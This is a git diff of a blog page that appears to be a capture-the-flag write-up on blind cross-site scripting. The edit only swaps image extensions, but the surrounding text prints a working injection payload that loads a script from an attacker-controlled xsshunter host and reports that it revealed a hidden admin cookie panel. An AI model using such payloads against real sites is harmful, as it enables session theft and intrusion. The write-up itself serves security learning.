@@ -22,7 +22,7 @@
 			<p> In a blind XSS injection the user is permitted to send a request on a particular webpage and that particular request is processed on another webpage therefore a user has no way to know weather or not there is an XSS vulnerability just by clicking the submit button on the first webpage. The strategy in these cases is to use an external server and pass some sort of a payload which when processed makes a hit on the external server which I would be controlling and from that hit I can figure out the page at which the request is being processed. You can either setup your own server or you can use the tool <a href="https://xsshunter.com/">XSS hunter</a>.</p>
 			<h2>The exploit</h2>
 			<p> On the feedback page we are presented with the following </p> 
-			<img class="img-fluid h-50" src="http://iamayushanand.github.io/assets/images/7jun2020/picone.jpeg" alt="page">
+			<img class="img-fluid h-50" src="http://iamayushanand.github.io/assets/images/7jun2020/picone.png" alt="page">
 
 			<p> By passing the payload &quot;&gt;&lt;script src=https://ayushsubdom.xss.ht&gt;&lt;/script&gt; on the feedback page and looking at the xsshunter dashboard we see a trigger by the page at /Secret_admin_cookie_panel.</p>
 			
@@ -31,7 +31,7 @@
 			<br>
 			<p> then we get the following alert and the ctf is solved</p>
 
-			<img class="img-fluid h-50" src="http://iamayushanand.github.io/assets/images/7jun2020/pictwo.jpeg" alt="final">
+			<img class="img-fluid h-50" src="http://iamayushanand.github.io/assets/images/7jun2020/pictwo.png" alt="final">
 		</div>
 	</body>
 
